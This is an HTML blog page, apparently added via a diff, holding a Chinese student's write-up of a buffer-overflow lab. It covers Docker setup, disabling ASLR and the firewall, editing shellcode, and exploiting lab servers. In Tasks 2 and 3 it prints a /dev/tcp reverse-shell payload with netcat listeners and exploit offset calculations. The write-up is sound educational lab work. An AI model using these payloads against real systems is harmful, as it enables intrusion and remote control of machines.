@@ -1,0 +1,1037 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/OIP-C.png">
+  <link rel="icon" href="/img/OIP-C.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="r0otsu">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="缓冲区溢出攻击实验">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Lab 4">
+<meta property="og:url" content="https://r0otsu.github.io/2024/12/25/lab4/index.html">
+<meta property="og:site_name" content="r0otsu Blog">
+<meta property="og:description" content="缓冲区溢出攻击实验">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028094757237.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028094850533.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028094928269.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028092751621.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028092839404.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028093028502.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028092942365.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028101608936.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028101817714.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028101923757.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028102055064.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028102127330.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241030135837904.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241030140728231.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241030142250670.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028102506947.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028102902239.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028105514401.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028110518599.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028111210764.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241029003549026.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241029003549026.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028121708338.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028121651830.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028121748465.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028174600553.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028174903178.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028174952491.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028180458922.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028180754152.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028180845540.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028181046545.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028181159693.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028181224926.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028181249641.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028181417879.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028181444541.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028181908364.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028202750544.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028200837605.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028201117195.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028201235213.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028201315181.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028201401911.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028201426974.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028201654875.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028201713906.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028204437694.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028214626827.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028214715757.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028214804469.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028214942433.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028215005173.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028214919940.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028215147772.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028215332105.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028215500517.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028220327114.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028231056206.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028230925916.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028231306151.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028231902836.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028231940965.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028232049131.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028232454462.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028232454462.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028232851649.png">
+<meta property="og:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028233010780.png">
+<meta property="article:published_time" content="2024-12-25T20:21:45.000Z">
+<meta property="article:modified_time" content="2024-12-26T09:24:04.309Z">
+<meta property="article:author" content="r0otsu">
+<meta property="article:tag" content="攻防实验">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://gitee.com/r0otsu/images/raw/master/image-20241028094757237.png">
+  
+  
+  
+  <title>Lab 4 - r0otsu Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/myfont/iconfont.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"r0otsu.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>r0otsu</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/index.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Lab 4"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-12-26 04:21" pubdate>
+          2024年12月26日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          20 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Lab 4</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <meta name="referrer" content="no-referrer" />
+
+<h1 id="Lab-4-缓冲区溢出攻击实验"><a href="#Lab-4-缓冲区溢出攻击实验" class="headerlink" title="Lab 4-缓冲区溢出攻击实验"></a>Lab 4-缓冲区溢出攻击实验</h1><h3 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h3><p>本实验的学习目标是让学生将从课堂上学到的有关缓冲区溢出漏洞的知识进行实践，从而获得有关该漏洞的第一手经验。缓冲区溢出是指程序试图将数据写入预先分配的固定长度缓冲区边界之外的情况。恶意用户可利用此漏洞改变程序的流控制，甚至执行任意代码。此漏洞是由于数据存储（如缓冲区）和控件存储（如返回地址）的混合造成的：数据部分的溢出会影响程序的控制流，因为溢出会改变返回地址。</p>
+<p>本实验将提供四台不同的服务器，每台服务器运行一个带有缓冲区溢出漏洞的程序。实验任务是开发一个利用漏洞的程序，并最终获得这些服务器上的root权限。除了进行这些攻击实验之外，还将试验几种针对缓冲区溢出攻击的对策。学生需要评估这些计划是否有效，并解释原因。</p>
+<hr>
+<h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><h4 id="准备docker"><a href="#准备docker" class="headerlink" title="准备docker"></a>准备docker</h4><p><font color='orange'>*这里因为我已经下好docker了，所以只是验证一下，没有配置docker请看<a href="#section1">第3步</a></font></p>
+<ol>
+<li><p>下载<code>handsonsecurity.tar</code>，使用离线方法，加载docker镜像；</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker load -i handsonsecurity.tar<br>Loaded image: handsonsecurity/seed-ubuntu:small<br></code></pre></td></tr></table></figure>
+
+<p>验证一下，发现已经加载成功了；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028094757237.png" srcset="/img/loading.gif" lazyload alt="image-20241028094757237"></p>
+</li>
+<li><p>返回<code>Labsetup</code>文件夹，使用命令开启docker；</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd ..<br>docker-compose build<br>docker-compose up<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028094850533.png" srcset="/img/loading.gif" lazyload alt="image-20241028094850533"></p>
+<p>已经建立连接了；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028094928269.png" srcset="/img/loading.gif" lazyload alt="image-20241028094928269"></p>
+</li>
+<li><p><a id="section1"><font color='orange'>*注：查看一下docker是否成功挂载：</font></a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl status docker<br></code></pre></td></tr></table></figure>
+
+<p><font color='orange'>如果没有反应的话下载docker.io（自行搜索一下）</font><font color='orange'>（记得换源之后下载）</font></p>
+</li>
+</ol>
+<hr>
+<h4 id="准备server"><a href="#准备server" class="headerlink" title="准备server"></a>准备server</h4><p><font color='orange'>*先尝试能不能直接<code>make</code>，如果可以就跳过第一步；因为我设置的默认gcc不是gcc-9，所以这里修改了一下<code>Makefile</code></font></p>
+<ol>
+<li><p>进入<code>server-code</code>文件夹，修改<code>Makefile</code>中指定的32位gcc版本；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028092751621.png" srcset="/img/loading.gif" lazyload alt="image-20241028092751621"></p>
+</li>
+<li><p><code>make</code>一下，成功了；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028092839404.png" srcset="/img/loading.gif" lazyload alt="image-20241028092839404"></p>
+<p><code>ls</code>后，发现编译完成了；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028093028502.png" srcset="/img/loading.gif" lazyload alt="image-20241028093028502"></p>
+</li>
+<li><p><code>make install</code>安装一下；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028092942365.png" srcset="/img/loading.gif" lazyload alt="image-20241028092942365"></p>
+</li>
+</ol>
+<hr>
+<h4 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h4><ol>
+<li><p>关闭防火墙：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo ufw disable<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>关闭ALSR(地址空间随机化)：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo /sbin/sysctl -w kernel.randomize_va_space=0<br></code></pre></td></tr></table></figure></li>
+</ol>
+<p><strong>至此，准备工作完成了！</strong></p>
+<hr>
+<h4 id="Task1-熟悉shellcode"><a href="#Task1-熟悉shellcode" class="headerlink" title="Task1: 熟悉shellcode"></a>Task1: 熟悉shellcode</h4><ol>
+<li><p>进入<code>shellcode</code>文件夹，运行<code>shellcode_32.py</code>和<code>shellcode_64.py</code>两个文件，得到<code>codefile_32</code>和<code>codefile_64</code>两个输出文件；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028101608936.png" srcset="/img/loading.gif" lazyload alt="image-20241028101608936"></p>
+</li>
+<li><p>修改一下<code>Makefile</code>文件中的gcc版本；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028101817714.png" srcset="/img/loading.gif" lazyload alt="image-20241028101817714"></p>
+</li>
+<li><p>使用<code>make</code>编译<code>call_shellcode.c</code>文件成功；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028101923757.png" srcset="/img/loading.gif" lazyload alt="image-20241028101923757"></p>
+</li>
+<li><p>测试一下两个输出文件；</p>
+<p><code>a32.out</code>：</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028102055064.png" srcset="/img/loading.gif" lazyload alt="image-20241028102055064"></p>
+<p><code>a64.out</code>：</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028102127330.png" srcset="/img/loading.gif" lazyload alt="image-20241028102127330"></p>
+</li>
+<li><p>根据task的要求，要求修改文件中的shellcode变量，执行删除文件的操作；</p>
+<p>先创建一个要被删除的文件<code>target_file.txt</code>（内容随意）；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241030135837904.png" srcset="/img/loading.gif" lazyload alt="image-20241030135837904"></p>
+<p>以此修改<code>shellcode_32.py</code>中的shellcode变量，因为要保证shellcode的字符数量相同，所以要用空格填充对齐；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241030140728231.png" srcset="/img/loading.gif" lazyload alt="image-20241030140728231"></p>
+</li>
+<li><p>先<code>make clean</code>清除一下，然后重新执行<code>shellcode_32.py</code>，<code>make</code>之后，重新执行<code>a32.out</code>输出文件，发现<code>target_file.txt</code>文件被删除；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241030142250670.png" srcset="/img/loading.gif" lazyload alt="image-20241030142250670"></p>
+</li>
+</ol>
+<p><strong>至此，task1完成了！</strong></p>
+<hr>
+<h4 id="Task2-Level-1-Attack"><a href="#Task2-Level-1-Attack" class="headerlink" title="Task2: Level-1 Attack"></a>Task2: Level-1 Attack</h4><p><strong>目标服务器及端口：10.9.0.5 9090</strong></p>
+<ol>
+<li><p>先测试一下目标服务器及端口能否连通；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028102506947.png" srcset="/img/loading.gif" lazyload alt="image-20241028102506947"></p>
+</li>
+<li><p>输入<code>^C</code>后，返回输入的字符长度为6；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028102902239.png" srcset="/img/loading.gif" lazyload alt="image-20241028102902239"></p>
+<p>得到<code>ebp=0xffffd4b8</code> 以及<code>buffer address=0xffffd448</code></p>
+</li>
+<li><p>进入<code>attack-code</code>文件夹，修改<code>exploit.py</code>文件；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028105514401.png" srcset="/img/loading.gif" lazyload alt="image-20241028105514401"></p>
+<p>修改shellcode变量为<code>shellcode</code>文件夹中的<code>shellcode_32.py</code>文件；</p>
+<p>修改start变量为<code>517-len(shellcode)</code>；</p>
+<p>修改ret变量为<code>ebp+n</code>，n为任意大于8的整型，即<code>0xffffd4b8+8</code>；</p>
+<p>修改offset变量为<code>0xffffd4b8-0xffffd448+4</code>，即为<code>116</code>；</p>
+</li>
+<li><p>执行<code>exploit.py</code>文件，并执行<code>cat badfile | nc 10.9.0.5 9090</code>语句，server中可以得到返回；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028110518599.png" srcset="/img/loading.gif" lazyload alt="image-20241028110518599"></p>
+</li>
+<li><p>根据task中的要求，为了获得权限，将<code>exploit.py</code>文件中的shellcode变量中：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;/bin/ls -l; echo Hello 32; /bin/tail -n 2 /etc/passwd     *&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>改为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>将发送给10.9.0.5的内容，返回给10.9.0.1，实现反弹shell；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028111210764.png" srcset="/img/loading.gif" lazyload alt="image-20241028111210764"></p>
+<p><font color='red'>*如何确定反弹shell的ip是否为10.9.0.1？</font></p>
+<p>在终端输入<code>ifconfig</code>后，可以看到的ip：</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241029003549026.png" srcset="/img/loading.gif" lazyload alt="image-20241029003549026"></p>
+</li>
+</ol>
+<hr>
+<ul>
+<li><p><font color='orange'>*如何确定反弹shell的ip是否为10.9.0.1？</font></p>
+<p><font color='orange'>在终端输入<code>ifconfig</code>后，可以看到的ip：</font><img src="https://gitee.com/r0otsu/images/raw/master/image-20241029003549026.png" srcset="/img/loading.gif" lazyload alt="image-20241029003549026"></p>
+</li>
+</ul>
+<hr>
+<ol start="6">
+<li><p>在另一个终端运行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lnv 9090<br></code></pre></td></tr></table></figure>
+
+<p>监听9090端口；<img src="https://gitee.com/r0otsu/images/raw/master/image-20241028121708338.png" srcset="/img/loading.gif" lazyload alt="image-20241028121708338"></p>
+</li>
+<li><p>运行<code>exploit.py</code>文件，将<code>badfile</code>发送给服务器；<img src="https://gitee.com/r0otsu/images/raw/master/image-20241028121651830.png" srcset="/img/loading.gif" lazyload alt="image-20241028121651830"></p>
+</li>
+<li><p>服务器中显示连接成功；<img src="https://gitee.com/r0otsu/images/raw/master/image-20241028121748465.png" srcset="/img/loading.gif" lazyload alt="image-20241028121748465"></p>
+</li>
+<li><p>另一个终端中监听的9090端口，也反弹shell成功！<img src="https://gitee.com/r0otsu/images/raw/master/image-20241028174600553.png" srcset="/img/loading.gif" lazyload alt="image-20241028174600553"></p>
+</li>
+</ol>
+<p><strong>至此task2完成！</strong></p>
+<hr>
+<h4 id="Task3-Level-2-Attack"><a href="#Task3-Level-2-Attack" class="headerlink" title="Task3: Level-2 Attack"></a>Task3: Level-2 Attack</h4><p><strong>目标服务器及端口：10.9.0.6 9090</strong></p>
+<ol>
+<li><p>先测试一下目标服务器及端口能否连通；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028174903178.png" srcset="/img/loading.gif" lazyload alt="image-20241028174903178"></p>
+<p>server端成功返回，测试成功：</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028174952491.png" srcset="/img/loading.gif" lazyload alt="image-20241028174952491"></p>
+<p>但是，level-2的docker终端并未返回ebp，只返回了<code>buffer address=0xffffd3f8</code>，但是buffer的大小必然在[100, 300]之间，所以可以用循环，每4字节替换为ret进行测试，则必然可以执行缓冲区溢出攻击成功。</p>
+</li>
+<li><p>修改<code>exploit.py</code>文件，添加循环；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028180458922.png" srcset="/img/loading.gif" lazyload alt="image-20241028180458922"></p>
+<p>修改ret变量为<code>buffer address +308</code>，即<code>0xffffd3f8+308</code>；</p>
+<p>添加有关offset的循环；</p>
+<p>注：由于先尝试让服务器简单溢出，所以选择了之前echo 32的代码；</p>
+</li>
+<li><p>执行<code>exploit.py</code>文件，并执行<code>cat badfile | nc 10.9.0.6 9090</code>语句；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028180754152.png" srcset="/img/loading.gif" lazyload alt="image-20241028180754152"></p>
+<p>server中可以得到返回，溢出攻击成功！</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028180845540.png" srcset="/img/loading.gif" lazyload alt="image-20241028180845540"></p>
+</li>
+<li><p>和task2一样，为了获得权限，修改<code>exploit.py</code>文件中的shellcode变量为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>将发送给10.9.0.6的内容，返回给10.9.0.1，实现反弹shell；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028181046545.png" srcset="/img/loading.gif" lazyload alt="image-20241028181046545"></p>
+</li>
+<li><p>在另一个终端监听9090端口；</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lnv 9090<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>运行<code>exploit.py</code>文件，将<code>badfile</code>发送给服务器；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028181159693.png" srcset="/img/loading.gif" lazyload alt="image-20241028181159693"></p>
+</li>
+<li><p>服务器中显示连接成功；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028181224926.png" srcset="/img/loading.gif" lazyload alt="image-20241028181224926"></p>
+</li>
+<li><p>另一个终端中监听的9090端口，也反弹shell成功了！</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028181249641.png" srcset="/img/loading.gif" lazyload alt="image-20241028181249641"></p>
+</li>
+</ol>
+<p><strong>至此task3完成！</strong></p>
+<hr>
+<h4 id="Task4-Level-3-Attack"><a href="#Task4-Level-3-Attack" class="headerlink" title="Task4: Level-3 Attack"></a>Task4: Level-3 Attack</h4><p><strong>目标服务器及端口：10.9.0.7 9090</strong></p>
+<ol>
+<li><p>先测试一下目标服务器及端口能否连通；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028181417879.png" srcset="/img/loading.gif" lazyload alt="image-20241028181417879"></p>
+<p>server端成功返回，测试成功：</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028181444541.png" srcset="/img/loading.gif" lazyload alt="image-20241028181444541"></p>
+<p>由此可见，10.9.0.7服务器上运行的是64位的程序，只要能够覆盖64位返回地址，就能实现64位程序的缓冲区溢出攻击。</p>
+<p>得到了<code>rbp=0x00007fffffffe3e0</code>和<code>buffer address=0x00007fffffffe310</code></p>
+</li>
+<li><p>复制<code>shellcode</code>文件夹中的<code>shellcode_64.py</code>文件作为<code>attack-code</code>文件夹中<code>exploit.py</code>文件的shellcode变量；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028181908364.png" srcset="/img/loading.gif" lazyload alt="image-20241028181908364"></p>
